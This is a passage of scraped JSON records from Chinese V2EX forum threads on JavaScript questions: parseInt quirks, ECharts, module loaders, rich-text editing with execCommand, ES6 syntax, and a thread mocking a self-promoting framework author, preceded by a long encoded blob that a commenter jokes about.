NXVNfa7rehfD7s6XnaNibIm75/Ha2b+9v0RMQpOhbSoFk1WmTHeo054ej/47ZAEXLd5fsfEx3XNUUxjhcp+0Q3nUOEMGAzIT789oPFuQN6Et7IsOXaMOiABNdKm+w68xgxKKs4Mjx0lqXO7UD9Av9v4z3R8l66ZS78D1XO86zGVXDVKCbGxfvsPj0JtoiUU2mYVCuwhU4VtlAJR9ZW98s88zw/ahLE9AoZpdok0700r7DoIFu8/PMLbXyoc1iM1Q67m/YzocuuZQyLIYSLJIjyYHSZfyS/tcGMjax2p1lcCudDWDynjmwh73N4+2Uc6t1tehJsFRVQyc3iwaOmIw29jCaNqawGH4U8ahk0QUznPwSnchYPc4piLKecrIrdJIsfPYfH5kCbpwgCrK6BoqhlrEkggtAxxaeZ0l3SRzEKphAveSdK2nZVOnJDAsS0Kz0nB9LxqwcPE/IhabHnsEMsVGDhlXz7t8Uz5+iJ4FPPgHQGWjDwMC2zpaU1gSePWrPQCAWi/LhuRH9luRl7fGWlVy7ongpDkfEsd9qBKfDDVezsvW16EtgUKyKZG/JczjIl3cqBhsgS3c8cCcB/JJk7LzLmHcO44oPkczwvdW0YIuP7n6Bb+fRZegJaw1je1wLpeYqFJJ3kFV0FBc4PwbXQJrC9VEZp7zOjuYCJU9zSC5pUZkcit7V8s0w39Kx+Rh74xp8jHfD0GXoiaJH2szCQ44bGgmRe2LaGTJY9hohSoSdjrlLXuP3K5J8eeZ29bdaZ143ZJrVIzGvqQ67+w4+RtH7yWXoS5BgWc/K1hUqqRhRkdBkQ7VGp3pKSWT/NZdvQpryB4tW2wnjXdOM7tqKAq2Y1M9KiwRn75e3D6zcX+3v0JNzRbhu6npVKIj/W9Hwniho9mhnJJLCJRq8NLX2j69wvsmTtJdXoLWTq8bxGJxFbQcgXubBPTwJrc2zhY6uTjZu9U4YNJL8t6ZXnnRaMmAdWrAHbn2XwQltiV5X94ImfOm+BZWzI/vBG1ZBtUm+ytdrraMAQRmZznUWclLGQ61IMbtakyP4jrHH5zdPIe+muSoXPFRW6Wc0hQL789g6s2HNn6EnIo8KiAz/VRLE95gotpMRVLNBCJHlsZiJX7WYVZMTEeV4j8OyG3Z2bYeZczDr0Jf/908O7by8uLdI6p65kQw6YCvRy8kEoduqiSDLjQXGfgXjkegLfTHXBCen91hc5MShp8loO1zNf54TYCGWTnxITOxxNIx9fO37p58XFs/Qk5CmeFEbE7jYLRaByqm0+1YhryfUUTHc6wDNNWHeqi9+55p42fe1NDTs850pm6SwGv/Pby4fvX188vk9PQh5DSi9zX1/oVV3RhJWQurZ0a2m2ZoLGxK21sr8nmRKrqppV5lrO39+oPYCa+3tY70v79CS0MZKkkCl42fRnkleiS2aIQXFQ5u8tiQpV136+sYFCbj7KJ9ouVTnulIACltQl5xShjBOhyAjbvXuJnoR46NsknKBxwf/WbRCJvk1khqRUUBz435ALXVOWWXG72/C5Lsukpk1Y1VmKGmAB/eFzrPX+Iq90dEq0xWClIBjjmDZFCgqlZqx0/EZRGTyNyX29oVumdbpXjLbr0yNFaTG1j8yLL2QYMHH8+V34nXvP0pOgmsTlo+1qst/pCndRWSix5m+KLyRqEOPiOFPFidFNvcZoibZhhtXd5jpJIM1LdwLxtd+EpaW1zYsbpbw5y/L8oDuV4UalYUbpMIYAAqKVE/ZowYVp9/VawkDve7qVutvcqQQIJA//fh8d5weLmPM0Ls4RoYiZx8kaFBgL3vdEyZDt2ZJKKbkqpbmhtbEDPelpN4kRN5nM94/ocIcaRhgocvZgcTbDTjlPFlUJHVLbdqiu0pmmPz5/k8eNC0pORc8TmbBHqCoPe7yjQFUtcLbMFZmV6w0M3W8vL6/9vHj8HD0Jd7yqJJ1qJZPilRUDbqcUGG7xe0sLJE\r", "```", "贴这么大串 吓尿", " orz", "\r"]},
{"content": ["<div class=\"topic_content\">ar = [NaN];\r<br>for (var i in ar) { console.log(i);};\r<br>// 输出 0 ! 至今不知为何。\r<br>\r<br>parseInt(0x9, 16);\r<br>// 9\r<br>parseInt(0x10, 16)\r<br>// 22 &lt;- insteresting!</div>"], "reply": "9", "tittle": "我感觉 js 的坑特别多", "comment": ["1 、 for 语句将 ar 当成 object 解析，因为数组本身就是一个 object ，数组的索引值与 object 的 key 对应。这里你可以这样理解 var ar = {0: NaN};for (var i in ar) { console.log(i);}; \r", "\r", "2 、 ", "\r", "\r", "parseInt(string, radix)\r", "\r", "参数 \t描述\r", "string \t必需。要被解析的字符串。\r", "radix \t可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。\r", "\r", "                如果省略该参数或其值为 0 ，则数字将以 10 为基础来解析。如果它以 “ 0x ” 或 “ 0X ” 开头，将以 16 为基数。\r", "\r", "                如果该参数小于 2 或者大于 36 ，则 parseInt() 将返回 NaN 。", "PS: parseInt(0x10, 16)  等于 parseInt(16, 16)", " 哈哈", "object -> for...in\r", "array -> for...of", " \r", "\r", "parseInt(0x10, 16) =  22\r", "parseInt('0x10', 16) = 16 \r", "何解", "推荐个文档，特别清楚。里面查一下就知道为什么是那个结果了。\r", " \r", "\r", "parseInt(0x10, 16) = parseInt(0x10.toString(), 16) = parseInt('16', 16)", " ... 晕了,原来如此..", "也真是佩服柯南的耐心"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近工作中在开发 desktop apps ，用的是 electron ，发现原生滚动条太丑，简直让人不能忍，找不太合适的，于是决定自己撸一个，叫 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/forsigner/nice-bar\">nice-bar</a>。</p>\n\n<p>求吐槽、求批判、求建议。</p>\n\n<p>Demo: <a target=\"_blank\" rel=\"nofollow\" href=\"http://forsigner.com/nice-bar/\">查看</a></p>\n\n<p>Pure JavaScript 版本： <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/forsigner/nice-bar\">nice-bar</a><br>\nAngular 版本： <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/forsigner/angular-nice-bar\">angular-nice-bar</a></p>\n</div></div>"], "reply": "2", "tittle": "下班时间写了一个美化网页滚动条轮子，欢迎吐槽", "comment": ["webkit 可以用 css 伪类直接定制滚动条样式", " 对的，但是很多时候需要 Cross Browser 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我是将 echarts 放在 div 里面，整个页面有很多 div ；<br>\n但是我导入的是 世界地图，滚轮一滚动就会将其放大或者缩小；<br>\n我想让这个 地图加载进来后就老老实实地在那里，但是不希望禁止鼠标的滚轮事件（因为还需要向下浏览），<br>\n请问应该如何处理呢？</p>\n</div></div>", "<div class=\"topic_content\">问题已解决。\r<br>roam: false,  就可以</div>"], "reply": "6", "tittle": "导入 echarts 地图后如何禁止其放大缩小？", "comment": ["应该有设置吧？\r", "或者在 echarts 里面禁止滚轮事件，这个不会影响浏览器的滚动才对", " 您好，请问这个地图好像不太行。 ", " 您好，请问这个地图好像不太行。 ", " 我傻逼了，谢谢您。 没有问题了", " 我傻逼了，谢谢您。 没有问题了"]},
{"content": ["<div class=\"topic_content\">手机不方便贴代码，是 promise 那里的</div>"], "reply": "12", "tittle": "看代码出现=>运算符代表什么啊", "comment": ["Arrow Functions ，可以参见 ", " 了解", "es6", "箭头函数超骚", "es6 语法", " 我都闻到味了", " 我买了这本书，但是老版本，", " \r", "老板也是有箭头函数说明的吧", "为啥我想起了“趋向于”运算符。。。", "箭头函数，相当于一个 function", "ruby 字典"]},
{"content": "", "reply": "12", "tittle": "JavaScript 的在线官方文档在哪里看(类似于 Python-doc 这种的) (找到了 2 个,Mozilla 和 W3School,选哪一个?)", "comment": ["MDN 不错的，看英文比较好，中文有的翻译不行或者没翻译", "你可以参考这个 ", "MDN 质量相对高一些，实在不行也可以考虑翻翻 ECMAScript 的文档", "喏，“在线”“官方”文档： ", " 这个可算是「事无巨细,毫无遗漏」了   :)", "ecmascript 的官方文档", "mdn", "只能 M D N 了", "阮老师的博客作为入门水平还是可以的。但是看他博客下面的评论，好多次都是评论指出错误了，所以我觉得也不能全信", "MDN 咯", "w3school 更早，在 MDN 之前大家都看他\r", "现在显然 MDN 做的更棒。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题,最近在折腾 js 的模块化开发,看了<strong>SeaJS</strong>和<strong>RequireJS</strong><br><br>\n但是这两种工具各说各有理,想听听大家对这两种工具的评价<br><br>\n - 这两个的适用空间有分别有哪些?<br><br>\n - AMD 标准和 CMD 标准的差异<br><br>\n - 除了这两个之外,还有没有其它常用的模块化开发工具?</p>\n</div></div>"], "reply": "20", "tittle": "编写 JavaScript 使用哪些模块化管理工具?", "comment": ["现在比较流行的是 CommonJS Module ，其实还是 `var foo = require('foo');`\r", "至于在浏览器上运行的话，一般是用 Browserify 或者 WebPack 将程序代码和所有依赖封装成单个 js\r", "另外都 2016 年了，应该去拥抱一下 ES6+ 了： `import { foo, bar } from 'foo';`，配合 Babel.js 和上面提到的两个封装工具就能写出现代的 Web 端 JS 了。", "CMD 推崇依赖就近，可以把依赖写进代码的任意一行。\r", "\r", "AMD 是依赖前置的，在解析和执行当前模块之前，必须指明当前模块所依赖的模块。", "webpack 可以支持 CMD AMD es6 ， SeaJS 搞了一堆自己的 API ，一般应用并没啥用。", "看一下这个 Slides 吧 ", "\r", "另，[玉伯： SeaJS 已死]( ", ")\r", "\r", "现在用 Webpack 就好，选用 CommonJS 或者 ES2015 module 然后打包\r", "\r", "前端基础知识可以看那些经典书籍经典文章，但是介绍前端工具的嘛，就算是两年前的文章也很有可能过时了", "webpack + es6 风格的 module", "建议用 TypeScript 的 module 。", "谢谢各位的宝贵建议,\r", "看来前端的技术更新速度确实很快,在下刚自学不久,之前有接触过一下 requireJS,今天偶然碰到了 SeaJS,还以为很新鲜,就研究了一下.\r", "看来走前端之路要时刻关注前线.", "现在很多公司主力 requirejs ，可以了解下 webpack", " 是的,现在跟的一个项目用的是 requireJS,\r", "打算先深入研究 requireJS,个人认为只要有能掌握一项,其它新的技术也应该大同小异,\r", "有了基础,上手会比较容易.\r", "个人拙见,还望指正.", "typescript + webpack ..", "用 typescript 吧", "webpack ＋ 1", "seajs 我感觉是自己搞死自己的，原则上之前是可以和 requirejs 拼一下的，接着去除了 shim 不支持 cmd 各种削减功能，搞得 js 还得自己加 script 标签，自己搞打包，虽然可能内部有支持用得起来，但是大众用的太痛苦了。\r", "\r", "然后现在都 webpack 了，但是 webpack 一直说自己不是 module loader ，然后 CDN 资源很难引入，搞得又有人搞了个轮子 $script\r", "\r", "我就想问下大家，要是我要 require 比如 百度地图 JS 版，我该怎么用 webpack 打包？\r", "求不用 $script 不用 script 标签的", " 直接用 script 或者 $script 会给你带来什么负担？以及你个人期望最好的方式是什么？", " \r", "这边撇开 SPA 不谈，只说一些传统页面\r", "\r", "比如要用 百度地图 JS 版，因为不开源只能用 URL 引用，而且链接带 key\r", "\r", "用 requirejs 或者 seajs 的时候 起码只要配置下 config ，然后再 require 就行了\r", "\r", "用 webpack ，要么必须每个页面，写个 script ，假如要换个 key ，那么得遍历搜索一番,另外百度地图也有自己的开源 lib 库，依赖就只能靠 script 标签顺序来保证 直接回到原始社会\r", "\r", "$script 则是没办法的产物，有 require ， require.ensure 但是没卵用，只能自己再造个$script\r", "\r", "最期望的当然是 webpack 能支持，或者能有插件支持。", "SeaJS 和 RequireJS 是不错的，但你要清楚一点，是别人的框架在 AMD ， CMD\r", "\r", "好像先前一位群员说自己的 PHP 程序是 MVC ，我就问他，你用什么框架，他说用 TP 框架，我就来一句，是 TP 就 MVC ，不是你在 MVC ，你站在肩膀头上不腰痛吗！\r", "\r", "----------------------minggeJS 之父回复", "webpack + es6 吧", "webpack/rollup es6", "webpack,browserify", "百度的 esl"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在线富文本编辑器里面，做以下操作：</p>\n\n<ol>\n<li>选中一串文字，点击“ B ”把它加粗。</li>\n<li>把游标移到这串文字的中间，再点“ B ”。</li>\n<li>输入一些文字。</li>\n</ol>\n\n<p>在大部分其他的编辑器里面，到第二步的时候，刚才加粗的所有文字都回复了正常状态:</p>\n\n<ul>\n<li>step1:  <strong>some bold text</strong></li>\n<li>step2:  some bold text</li>\n<li>step3:  some inserted text bold text</li>\n</ul>\n\n<p>而知乎的编辑器的效果是这样：</p>\n\n<ul>\n<li>step1:  <strong>some bold text</strong></li>\n<li>step2:  <strong>some bold text</strong></li>\n<li>step3:  <strong>some</strong> inserted text <strong>bold text</strong></li>\n</ul>\n\n<p>从 HTML 上面看，它是把一个&lt;b&gt;&lt;/b&gt;节点拆成了三个节点：<br>\n    &lt;b&gt;some&lt;/b&gt;inserted text&lt;b&gt;bold text&lt;/b&gt;.</p>\n\n<p>问题是：在 contentEditable 上的编辑操作只能更新当前节点的文本内容，也就是说如果没有 js 干预，效果是这样：<br>\n    &lt;b&gt;some inserted text bold text&lt;/b&gt;</p>\n\n<p>知乎的编辑器是怎样完成分拆动作的？<br>\n 监听 keypress 事件？那输入中文怎样实现？<br>\n 监听 change ？</p>\n</div></div>"], "reply": "15", "tittle": "请教前端达人，知乎的编辑器是怎样实现这个功能的？", "comment": ["知呼这个不是浏览器的默认处理方式吗……", " 不是，浏览器本身并不知道已经取消了 Bold 样式。", "表示 ueditor 也跟知乎一样", "知乎的编辑器用的 Google Closure\r", "\r", "- ", "\r", "- ", "\r", "- ", "刚刚看了一下 UEditor ，行为和知乎的一样，用了一种很取巧的方法：在步骤 2 的时候，它就把原来的<b></b>分拆成两个,并在中间增加了一个不可见字符节点，<b></b>＆ 1234 ；<b></b>，这样，接下来插入文字就是在不可见字符的节点上插入的，是没有加粗的。\r", "\r", "但是知乎的编辑器不是这样做的。", " 我用 Chrome 试了，浏览器本身的行为就是这样。你明明第二次点了 B ，浏览器怎么可能不知道呢？ \r", "你随便找个 contenteditable 的输入框，打一串文字按 command/ctrl + b ， 然后点一个中间的地方，再按下 command/ctrl + b ，然后打字，不就是你所谓的效果吗？明明按了第二次 B 取消了 bold ，为什么叫浏览器不知道呢？还是我理解有问题？\r", "\r", "你要是觉得自己按 bold 和 js 执行的不一样（其实就是一样的），那我给你写了个小 demo ： ", " \r", "理解问题，我说的 B 按钮是编辑器自己实现的控件。\r", "\r", "ctrl-B 实现的浏览器的 bold 状态切换, 有 javascript 的接口吗？", " ……有啊，你看我的 demo\r", "\r", "都有哪些命令的话： ", "\r", "\r", "editing 相关： ", " 谢谢。\r", "zhihu 就是用 execCommand 实现的", "其实非常简单的\r", "\r", "判断当前光标下是否为粗体\r", "document.queryCommandState('bold')\r", "\r", "切换当前光标下粗体状态\r", "document.execCommand('bold')", " \r", "那这样的话，写一个富文本编辑器不是很简单吗？只要用 execCommand 做命令映射就好了，所有的 DOM 变更操作都由浏览器实现好了。\r", "\r", "尝试做这个主要是因为看到这个问题：\r", "\r", "\r", "那些说很难做的，到底难度在哪里？", " 看你的富文本编辑器有哪些功能了。如果就是那几个很基本的功能，调调 api 就能实现的那是可能比较简单。\r", "\r", "即便如此实际上你做的时候可能遇到各种各样奇怪的 case ，比如从外部复制粘贴过来的时候。还有就是浏览器兼容性问题。\r", "\r", "不过不管简单还是难，对最终数据的处理比如过滤什么的也是比较麻烦的。安全性也是很重要的呢。", " 同意。\r", "\r", "也有一些编辑器不是完全利用 execCommand 来实现编辑操作的，比如 Medium 的编辑器实现了一个自定义的 Model ，操作是对这个 Model 的修改，然后再把 Model 映射成 DOM 。\r", "\r", "\r", "\r", "W3c 的文档里提到了这篇博客，业界实践也能推动标准。", " 浏览器自带的那一套主要问题是不同浏览器有不少小差异，比如剪切板 API 差异，换行处理的差异，键盘事件差异， executeCommand 行为不一致等等，要完全搞清楚这一套还是得看不少源码好好总结的。\r", "\r", "DOM 模型针对一个编辑器而言过于复杂了，另外 executeCommand 在不同浏览器行为略有差异，所以有些编辑器搞一个自己的文档模型，这样也好保证各种命令行为一致。\r", "\r", "编辑器还有一个难题，是怎么抽象一个可扩展的接口，方便扩充能力。 ckeditor 扩展做得好，生态才比较好，想要什么功能，网上都有插件。\r", "\r", "另外还了解过 quill.js ，开发很活跃，代码很清晰。也是自己搞的一套文档模型，很有学习价值。不过这家伙原来用 coffeescript ，一次推翻重来改用 ES6 重写，现在已经不敢在产品里用它了。。\r", "\r", "另外推荐 tower.im 出的 simditor ，这个是没有自己的文档模型的，但是已经很成熟了，也在不少产品中有使用（ teambition 也是用的它，哈哈）。我们产品上个月刚换它，效果还不错的，也很方便自己扩展。", "我以前写过这种编辑器，就是比较费时间，但是这东西真心不难"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如说我有一个 echarts 的地图，地图是这个：<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://echarts.baidu.com/echarts2/doc/example/map4.html\">http://echarts.baidu.com/echarts2/doc/example/map4.html</a><br>\n我初始化的时候 echarts 的 data:[]是为空的， 但是我在页面上想做到这样的效果：</p>\n\n<p>单击 2010 年按钮，就会有 2010 年的数据，地图也是 2010 年的人口地图<br>\n单击 2011 年按钮，就会有 2011 年的数据 。。。。。。</p>\n\n<p>也就是说， echarts 在初始化以后，如何动态地与后端服务器进行交互来改变 echarts 的 data?</p>\n</div></div>"], "reply": "9", "tittle": "echarts 的数据如何动态地和后端交互? 比较急，求助", "comment": ["在 Ajax 回调中改变 option 中 data 的值，然后 setOption 刷新。", " 请问如何改变 option 中 data 的值？", " 我现在只想到重绘这个 echarts", " 如果你的 option 是一个全局变量……\r", "这么写可能有点 dirty ，但是挺方便。\r", "\r", "我不太确定 EC 里是否有对应的 API ，你可以查询一下 documentation 。", " 我第一个回复就告诉你了。\r", "你重新 init 后 setOption(option, true)就是重绘。", " 好的 谢谢您", "你可以看一下这个官方示例： ", "\r", "\r", "官方的 data 是随机生成的，你需要换成 ajax 轮询交互后台获取数据\r", "\r", "然后在\r", "    setInterval(function (){}\r", "这个方法里设置\r", "    option.xAxis[0].data.shift();\r", "    option.xAxis[0].data.push(axisData);\r", "    option.xAxis[1].data.shift();\r", "    option.xAxis[1].data.push(app.count++);\r", "\r", "    myChart.setOption(option);\r", "更改你需要的坐标和数据\r", "\r", "这样就能实现动态更新数据。", "ajax 重新设置 option 就行了\r", "echarts 这点做的比 highcharts 简单多了 不过新版本还是好多 bug", "ajax 异步获取数据以后，把值重新赋给 option 里面的参数，再 setOption 就 ok 了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在有一个对象名为 map 有属性 a, b, c<br>\n表示为：<br>\nObject {a: 1, b: 2, c: 3}</p>\n\n<p>现在想把这个对象变为对象数组，形式如下：</p>\n\n<p>[{name : 'a', value : 1}, {name : 'b', value : 2}, {name : 'c', value : 3}]</p>\n\n<p>请问应该怎么做呢？</p>\n\n<p>另外能不能麻烦各位推荐一下 JavaScript 的优秀的入门 /参考书籍？谢谢了</p>\n</div></div>"], "reply": "20", "tittle": "JavaScript 对象，属性变成对象数组 求解。", "comment": ["手动遍历可以么\r", "```\r", "var o = {a:1,b:2,c:3};\r", "var no = [];\r", "for(var k in o)\r", "{\r", "    no.push({name:k,value:o[k]});\r", "}\r", "console.log(no);\r", "```", "var arr = [];\r", "var obj = {a:1,b:2,c:3};\r", "var temp;\r", "for(var key in obj){\r", "    temp = {};\r", "    temp.name = key;\r", "    temp.value = obj[key];\r", "    arr.push(temp);\r", "}\r", "console.log(arr)", "如果有其他语言基础，我还是推荐这本[JavaScript: The Good Parts]( ", ")", "楼主有没有听说过 Lodash/underscore ？", "好吧，仔细看了下，楼主要的格式和 toparis 的有点区别\r", "\r", "无法保证顺序", "Object.entries(o).map(([name, value]) => ({name, value}));", "遍历一下不就行了，不知道楼主纠结在哪", "{name:k, value: v} for k,v of map", "Object.keys(obj).map(key => {name: key, value: obj[key]})", "7 楼 es2015 正解", "var arr=[],i = 0;\r", "var obj = {a:1,b:2,c:3}\r", "for(var k in obj){\r", "   if(obj[k]){\r", "       arr[i++] = function(){\r", "              return {\r", "                  name:k,\r", "                  value:obj[k]\r", "             }\r", "       } ();\r", "   }\r", "}\r", "console.log(arr);", " 还真不是 2015 的， entries 是 2016 的", "7 楼跟 10 楼都是手撸的吗，都报错了。", "lodash: \r", "var pairs = _.map(o, function(v, k) {\r", "  return { name: k, value: v };\r", "});", " 果然是，是我技术太渣了= =", " 基本没有浏览器支持 es6/7 ……", "underscore 或者 lodash 应该成为标配...自从用了就离不开了.", "lodash\r", "\r", "```js\r", "var obj = {a: 1, b: 2, c: 3};\r", "_.map(obj, (v,k) => { \r", "  return {\r", "    name: k,\r", "    value: v\r", "  };  \r", "});\r", "```"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想问下做前端不会 JQ 能找到工作吗</p>\n\n<p>我是完全不会那种，</p>\n</div></div>"], "reply": "54", "tittle": "想问下做前端不会 JQ 能找到工作吗", "comment": ["1.能\r", "2.学", "估计不太能，因为 jq 实在是太特么简单了。这都不会的话，学习能力可能有点小问题。。", "面试的时候你可以说我会 MinggeJS 比 JQ 强很多（", "您肯定没问题啊！", "  智商低，学不会有救吗", "如果 jquery 都学不会，那还能学会啥？看楼上都能写一个 jquery", "不愧是明哥", "安利他们把项目用 MinggeJS ，替换掉 jQuery", "污染人眼球\r", "V2EX 不是娱乐社区\r", "已经永久 block", " 看来你不必要道歉呢...人家就喜欢这个范儿", "顺道问下，会 jquery 能找到前端工作么？", "会 MinggeJS 就会 jQuery", "你不可能不会 jQ 会 mingge 就会 jQ", " 不用 AT 我了，已经永久 block 了", "如果 V2EX 能根据 block 数和点击阅读数做一个策略规则匹配,然后自动 block 掉一些类娱乐帖,是不是很漂亮？\r", "\r", "哦。我歪楼了。。抱歉~", "这是恶心推广吗？\r", "准备做 web 界的凤姐么……祝你成功吧……", " 不是娱乐帖，我是不会 JQ ，所以才发贴询问大家意见", "这 B 装得只能给 1 分，就和有的公司招聘要求 985 学校，然后你直接问人家，“啊，我不是 985 啊，我是哈佛大学毕业的，能有面试机会么？”差不多， jq 又不是很难得东西，有这时间来这问早就 api 过一遍了，搞技术就搞技术，整成个娱乐圈似得，缺铜币了？", "能， js 遛比会 jq 好得多", "明哥我要给你生猴子", "别人不知道。。您一定可以的", "你要是不会 node.js 或者 javascript 还差不多， jquery 这种接近白话了你要是学不会真的是太 low 了。", "你不会 jquery 怎么能做到 minggeJS 兼容 jquery", " 本来还有些同情，虽然看起来那个啥了些，不过被 V 友、知乎那么多人嘲讽估计心里还是挺难受的，不过现在一看这位本尊的发帖记录和本帖的“用心”之后，只有一个感想——大家干得漂亮！！！\r", "\r", "BTW ，我也永久 block+1", "长亭外，古道边，芳草天。\r", "这是我在 v2 第一次用到 block 功能，真是恶心。", "我不会 jquery ，但是我会 minggeJS→_→", "当然不能。 jquery 这种标配。 前端程序默认都应该会的。。。", "talk is cheap\r", "\r", "blocked", "做移动端的前端开发就不用 jQ ，虽然我不知道 LZ 是想干嘛，不过我还是认真回答了", "装逼犯", "我给你 125 分，之所以给一半是因为怕你骄傲。", "花半小时你就学会了 干嘛不学一下呢？", "烂坑", "block", "俺 scala 都会了，好像也没有花多长时间，学着有乐趣的干活。也没想到 scala 为将来找工作啥帮助。算是不务正业了吧~\r", "lz 的话不学 jq 是兴趣问题？还是，了解一下那是啥吧先，真不想学就算了，据说学习能力强一点的话，到时候现学也可以。\r", "找工作的话真不知道，还没找过呢~~", "发现认真回复的基本都是不知道明哥的人-。-", "block", "您可以的！养猪场还缺很多人的！", "就为了来装逼的么？ 有意思么？", "不能", "其实 minggeJS 还是写的相当好的=。=起码比我高的不知到那里去了\r", "就是这推广方式。。。", "围观。。。", "看头像知内容", "请问楼上各位，你们说的 JQ 是什么，好像大家都知道的样子\r", "我只知道 IQ 、 EQ 和 QQ /掩面逃", " 奸情", "不会 JQ ，那你怎么抄袭 JQ 呢。。。\r", "说错了，你怎么超越 JQ 呢", "想问下做前端不会 MinggeJS 能先到工作吗……", "不会 jq 没问题，问题是你 js 也不会，你还问个蛋", "jq 必须会，不是因为 jq 简单，而是因为 jq 的功能太基础太常用了，很多库都是基于 jq 来开发的。", "可以的。我司前端只要会切图写 css 。调用 jq 是后端程序员的事。", "发现用心回复的都是不知道 明哥 的人！\r", "\r", "给你们安利一下 明哥 ， minggeJS 的核心开发者！\r", "minggeJS ， 一个比 jquery 更牛逼的前端 js 框架！\r", "（每帖 5 毛，括号内删除）\r", "\r", "顺便 block!", "那些 block 别人还要在帖子里告诉对方的人，我觉得挺傻逼的。。。\r", "为了让对方后悔？刷存在感吗？要 block 就痛痛快快的 block ，说出来干啥？\r", "\r", "以上和本贴子内容无关，当然看了本楼不爽的，希望你 block 我，不过拜托不要告诉我，管我 P 事", "不能，即使会 js 了还不会 jQ ？？？别说 js 用的有多溜多溜。。。", "能。反正我太会"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>花了 6 天终于看完阮一峰的 es6 ，并且写好了对应的简版 es6 教程，祝大家看这个能 5 个小时学会 es6 。 这是我的教程地址： <a target=\"_blank\" rel=\"nofollow\" href=\"http://t.cn/R4N3Qsf\">http://t.cn/R4N3Qsf</a></p>\n</div></div>", "<div class=\"topic_content\">觉得我写的不错博客还算有用的话，快来 star 我的博客项目吧。(别人博客项目少则都有 50 60 ，我才 3star sad)\r<br>\r<br><a target=\"_blank\" href=\"https://github.com/SimplyY/Blog\" rel=\"nofollow\">https://github.com/SimplyY/Blog</a></div>", "<div class=\"topic_content\">话说博客重写中=。=\r<br>\r<br>\r<br>            这段时间，想看我的博客的，其实我的所有博文都在 github repo 的，欢迎 star 。\r<br>            不过大家要在 repo 里找找，没博客那么方便。\r<br> <a target=\"_blank\" href=\"https://github.com/SimplyY/blog/tree/master/Article\" rel=\"nofollow\">https://github.com/SimplyY/blog/tree/master/Article</a></div>", "<div class=\"topic_content\">博客主要功能重写好了，简版 es6 教程  在这里 <a target=\"_blank\" href=\"http://localhost:8080/tag/56c2d7976ba384e02299f9c8\" rel=\"nofollow\">http://localhost:8080/tag/56c2d7976ba384e02299f9c8</a></div>", "<div class=\"topic_content\">刚才打错了，应该是这里。。 <a target=\"_blank\" href=\"http://simplyy.space/tag/56c2d7976ba384e02299f9c8\" rel=\"nofollow\">http://simplyy.space/tag/56c2d7976ba384e02299f9c8</a></div>"], "reply": "47", "tittle": "简版 es6 教程", "comment": ["这个主意不错，支持楼主", " 阮一峰里面，“下面的例子，另一个例子”，还有很多可以举一反三的也很详细的写上去了，总之太多了，看的太累了。\r", "\r", "他的非常适合新手看，但是现在学 es6 的新手应该不多吧。。。", "咦，，我写的博客在服务器里出问题了。。我去瞧瞧。。", "重启服务器就好了= =，不知名 bug ，寒假重写势在必行。。", "我已经看了 10 天了……心好累 - -", "解构赋值这么反人类的阅读体验不知道是哪个白痴设计的", " 23333 ，我写完心更累，每天 3 小时以上。。。", " 我觉得还好啊，", "我也在看，新手，很好的教程！不过需要耐心。", " 很理想的功能", "欢迎加入 typescript ，😄😄", " \r", " \r", "let [foo, [[bar], baz]] = [1, [[2], 3]]\r", "这种大圈套小圈的写多层纯属自找苦吃\r", "根本没有一行解决一个赋值清楚\r", "\r", "let { first: f, last: l } = obj;\r", "这种冒号等于是 as 的语义，为什么不用 as 更直观？\r", "\r", "var [a, b, c] = [1, 2, 3];\r", "这种最简单的写长了对不准都很难查 bug", " 语法糖。。。何必写的复杂，，就好比列表推导，复杂起来， debug 也很蛋疼。\r", "\r", "但是我觉得吧，语法糖放在一杯子水里面它是甜的，放到水瓶里，它就没味道，反而累赘", " \r", "这种影响阅读的根本就不算糖\r", "ES6 就算没有这样的糖也完全不受影响\r", "加了如果被滥用反而增加维护难度", " 这个是没办法的事情 任何好东西 如果在极端情况下都是行不通的\r", "这些很多情况下是为了简化函数传递参数时候大量的代码\r", "一行解决一个赋值 虽然清楚 但是如果这个 object 非常复杂的话 你会发现一个函数可能超过一半的代码是在一个个赋值 我就遇到过无数次了\r", "\r", "对于第一个例子 那很明显只是一个比较极端的例子 真是情况下 估计除了按照模式解开 JSON 这种情况外 都是没事找抽\r", "\r", " 我觉得这些语法糖 应该是要有的 毕竟可以提高写代码的效率\r", "我可不希望写代码的时候 大部分都是无关逻辑的废话（比如很多赋值和转换）\r", "当然任何时候 如果过于使用这些 都会造成这些困难 本来 JS 就已经是这样了\r", "这个是看人 而不是看工具", " 非常赞同，“任何好东西 如果在极端情况下都是行不通的 ” “语法糖 可以提高写代码的效率 ”", " \r", "认同，所以我认为官方提供一个按模式解 JSON 的功能足矣，把其他找抽的途径关闭。\r", "再不济大家在博客和论坛传播的时候也应该多指出找抽的点，并提倡规避他。", "太好了 要的就是简明易查", " \r", "另外那个 as 语义的冒号真是非常低劣，之前冒号都是赋值的语义，从左往右读，在这里生生的变歧义了，从右往左读。", "多一种方法，在某些情况下适用，而不是适合所有情况。\r", "怎么写还是需要发挥主观能动性。", " \r", "这主观能动性失控以后 js 要走上 perl 的老路\r", "作为一个工程化的语言\r", "如何尽可能的减少初级程序员犯错的可能才是最重要的", "感谢楼主的整理。如果博客样式能照顾一下小屏就更好了。\r", "\r", " 5ob4fj20k00zk0xk", " 5ob4fj20k00zk0xk", "然而并没有证据表明这会增加‘初级程序员犯错的可能’，不用也不会减少犯错的可能\r", "如果事实证明这个特性鸡肋，那么下个 ES7 或者以后的版本应该会淘汰。\r", "毕竟实践出真知。", " t.cn/R4NkaqN", "对不起...老是写错链接\r", "  你屏幕分辨率多少来着，，，我寒假准备重写，", " 1280x720 不知道是不是高 DPI 的坑。", "  你写一下 Haskell 就知道没模式匹配的语言有多恶心", "阮一峰老师： ", "\r", "廖雪峰老师： ", "\r", "请问这两位大神的课程，应该选哪个？", "es5 还没学会呢~", " 俩不一样好吧，，一个 es6 ，一个 es5 吧", " 我 mac ， chrome 开发的， 